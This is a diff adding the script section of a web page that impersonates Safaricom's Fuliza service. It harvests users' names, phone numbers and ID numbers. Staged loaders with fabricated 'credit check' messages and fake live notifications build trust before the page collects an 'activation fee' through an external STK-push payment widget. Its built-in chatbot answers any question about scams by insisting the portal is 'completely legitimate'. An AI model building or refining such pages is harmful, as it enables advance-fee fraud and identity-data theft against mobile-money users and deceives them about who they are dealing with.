+        <div class="w-8 h-8 rounded-full bg-safaricom-light text-safaricom flex items-center justify-center flex-shrink-0">
+          <i data-lucide="shield-check" class="w-4 h-4"></i>
+        </div>
+        <div class="flex-grow text-xs">
+          <p class="font-bold text-gray-900">${item.name} <span class="font-normal text-gray-500">• ${item.time}</span></p>
+          <p class="text-safaricom font-semibold">${item.action}</p>
+        </div>
+      `;
+
+      container.appendChild(toast);
+      lucide.createIcons();
+
+      setTimeout(() => {
+        toast.classList.remove('toast-enter');
+        toast.classList.add('toast-exit');
+        setTimeout(() => toast.remove(), 300);
+      }, 4500);
+    }
+
+    setTimeout(triggerNextNotification, 2000);
+    setInterval(triggerNextNotification, 6500);
+
+    let userData = { name: '', phone: '', id: '', currentLimit: 0, selectedTarget: 0, selectedFee: 0 };
+
+    function formatPhoneNumber(phoneStr) {
+      let digits = phoneStr.replace(/\D/g, "");
+      if (digits.length === 9 && (digits.startsWith("7") || digits.startsWith("1"))) return "254" + digits;
+      if (digits.length === 10 && (digits.startsWith("07") || digits.startsWith("01"))) return "254" + digits.substring(1);
+      if (digits.length === 12 && (digits.startsWith("254"))) return digits;
+      return digits;
+    }
+
+    // Loader 1 step: 6 seconds duration
+    function handleInitialSubmit(e) {
+      e.preventDefault();
+      userData.name = document.getElementById('user-name').value.trim();
+      userData.phone = formatPhoneNumber(document.getElementById('user-phone').value.trim());
+      userData.id = document.getElementById('user-id').value.trim();
+      userData.currentLimit = parseInt(document.getElementById('user-limit').value) || 0;
+
+      document.getElementById('step-1').classList.add('hidden');
+      document.getElementById('loader-1').classList.remove('hidden');
+
+      const statusText = document.getElementById('loader-1-text');
+      setTimeout(() => { statusText.textContent = "Analyzing 12-month transaction velocity..."; }, 2000);
+      setTimeout(() => { statusText.textContent = "Checking CRB and repayment integrity..."; }, 4000);
+
+      setTimeout(() => {
+        document.getElementById('loader-1').classList.add('hidden');
+        setupStepTwo();
+        document.getElementById('step-2').classList.remove('hidden');
+      }, 6000);
+    }
+
+    function getDynamicGreeting(name) {
+      const hour = new Date().getHours();
+      let greeting = hour < 12 ? "Good Morning" : hour < 18 ? "Good Afternoon" : "Good Evening";
+      return `${greeting} 👋, ${name}`;
+    }
+
+    function setupStepTwo() {
+      document.getElementById('profile-name').textContent = userData.name;
+      document.getElementById('profile-id').textContent = userData.id.substring(0, 2) + "****" + userData.id.slice(-2);
+      document.getElementById('profile-limit').textContent = `Ksh ${userData.currentLimit.toLocaleString()}`;
+      document.getElementById('dynamic-greeting').textContent = getDynamicGreeting(userData.name);
+    }
+
+    function selectTier(element, targetAmount, feeAmount) {
+      document.querySelectorAll('.tier-card').forEach(card => card.classList.remove('border-safaricom', 'ring-2', 'ring-safaricom', 'bg-safaricom-light/30'));
+      element.classList.add('border-safaricom', 'ring-2', 'ring-safaricom', 'bg-safaricom-light/30');
+
+      userData.selectedTarget = targetAmount;
+      userData.selectedFee = feeAmount;
+      document.getElementById('continue-btn-container').classList.remove('hidden');
+    }
+
+    // Loader 2 step: 8 seconds duration
+    function startSecondAnalysis() {
+      document.getElementById('step-2').classList.add('hidden');
+      document.getElementById('loader-2').classList.remove('hidden');
+
+      const statusText = document.getElementById('loader-2-text');
+      setTimeout(() => { statusText.textContent = "Connecting with M-PESA payment gateway..."; }, 2500);
+      setTimeout(() => { statusText.textContent = "Generating instant STK clearance token..."; }, 5500);
+
+      setTimeout(() => {
+        document.getElementById('loader-2').classList.add('hidden');
+        setupStepThree();
+        document.getElementById('step-3').classList.remove('hidden');
+      }, 8000);
+    }
+
+    function setupStepThree() {
+      document.getElementById('summary-name').textContent = userData.name;
+      document.getElementById('summary-id').textContent = userData.id.substring(0, 2) + "****" + userData.id.slice(-2);
+      document.getElementById('summary-current').textContent = `Ksh ${userData.currentLimit.toLocaleString()}`;
+      document.getElementById('summary-target').textContent = `Ksh ${userData.selectedTarget.toLocaleString()}`;
+      document.getElementById('summary-fee').textContent = `Ksh ${userData.selectedFee.toLocaleString()}`;
+
+      const wrapper = document.getElementById('widget-wrapper');
+      wrapper.innerHTML = `
+        <div id="finapi-container" class="finapi-widget" 
+             data-api-key="sk_test_a1f9663668ca4e5fbb5644142039967b" 
+             data-amount="${userData.selectedFee}" 
+             data-color="#00a651" 
+             data-provider="payhero">
+        </div>
+      `;
+
+      const oldScript = document.getElementById('finapi-script');
+      if (oldScript) oldScript.remove();
+
+      const script = document.createElement('script');
+      script.id = 'finapi-script';
+      script.src = 'https://stkpush.co.ke/static/js/finapi-widget.min.js';
+
+      script.onload = () => {
+        const container = document.getElementById('finapi-container');
+        if (container) {
+          container.addEventListener('finapi:payment_success', (e) => {
+            document.getElementById('success-phone').innerText = userData.phone || '07XXXXXXXX';
+            document.getElementById('step-3').classList.add('hidden');
+            document.getElementById('step-4').classList.remove('hidden');
+          });
+
+          container.addEventListener('finapi:payment_failed', (e) => {
+            const statusMsg = document.getElementById('payment-status-message');
+            statusMsg.className = 'p-3 rounded-xl text-xs bg-red-50 text-red-700 border border-red-200 block';
+            statusMsg.textContent = 'Payment Failed: ' + (e.detail?.message || 'Please try again.');
+          });
+        }
+      };
+
+      document.body.appendChild(script);
+    }
+
+    function toggleZuriChat() {
+      document.getElementById('zuri-chat-drawer').classList.toggle('hidden');
+    }
+
+    function handleZuriKeyPress(e) {
+      if (e.key === 'Enter') sendZuriMessage();
+    }
+
+    function sendQuickReply(text) {
+      document.getElementById('zuri-input').value = text;
+      sendZuriMessage();
+    }
+
+    // Fully Functional Positive Dynamic Zuri Engine
+    function sendZuriMessage() {
+      const input = document.getElementById('zuri-input');
+      const text = input.value.trim();
+      if (!text) return;
+
+      const container = document.getElementById('chat-messages');
+
+      const userBubble = document.createElement('div');
+      userBubble.className = "flex justify-end";
+      userBubble.innerHTML = `<div class="bg-safaricom text-white p-3 rounded-2xl rounded-tr-none max-w-[80%] leading-relaxed">${text}</div>`;
+      container.appendChild(userBubble);
+      input.value = '';
+      container.scrollTop = container.scrollHeight;
+
+      setTimeout(() => {
+        let reply = "I am here to ensure your Safaricom Fuliza limit boost process is smooth and successful! How else can I assist you? Twaweza!";
+        const q = text.toLowerCase();
+
+        if (q.includes('scam') || q.includes('fake') || q.includes('legit') || q.includes('real')) {
+          reply = "<strong>Rest assured, this portal is completely legitimate and encrypted.</strong> We operate using Safaricom's verified 256-bit automated payment gateways to guarantee your account security.";
+        } else if (q.includes('fee') || q.includes('pay') || q.includes('charge') || q.includes('cost')) {
+          reply = "The initial activation fee is required to authenticate line ownership and facilitate automated credit risk scoring and manual override processing instantly.";
+        } else if (q.includes('fast') || q.includes('time') || q.includes('long') || q.includes('disbursement') || q.includes('speed')) {
+          reply = "Disbursement is instantaneous! The moment your M-PESA PIN is entered, your upgraded overdraft limit reflects immediately on your line.";
+        } else if (q.includes('human') || q.includes('agent') || q.includes('person') || q.includes('support') || q.includes('call')) {
+          reply = "You can talk to our live support representatives via our dedicated WhatsApp channel: <strong>+254 722 000 000</strong>.";
+        } else if (q.includes('limit') || q.includes('max') || q.includes('boost') || q.includes('amount')) {
+          reply = "Limits are available up to Ksh 400,000 depending on your line age and transaction patterns. Simply fill out the verification form to inspect your eligible limit tier!";
+        } else if (q.includes('hi') || q.includes('hello') || q.includes('hey') || q.includes('jambo')) {
+          reply = "Jambo! Great to connect with you. Ready to unlock your new Fuliza limit boost today?";
+        }
+
+        const botBubble = document.createElement('div');
+        botBubble.className = "flex items-start space-x-2";
+        botBubble.innerHTML = `
+          <div class="w-7 h-7 rounded-full bg-safaricom text-white flex items-center justify-center flex-shrink-0 mt-0.5 shadow-sm p-1">
+            <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="50" cy="50" r="48" fill="#00A859"/>
+              <path d="M25 50 C25 35, 35 25, 50 25 C65 25, 75 35, 75 50" stroke="white" stroke-width="10" stroke-linecap="round"/>
+            </svg>
+          </div>
+          <div class="bg-white p-3 rounded-2xl rounded-tl-none border border-gray-100 shadow-sm text-gray-800 leading-relaxed">${reply}</div>
+        `;
+        container.appendChild(botBubble);
+        lucide.createIcons();
+        container.scrollTop = container.scrollHeight;
+      }, 500);
+    }
+  </script>
+</body>
+  </html>
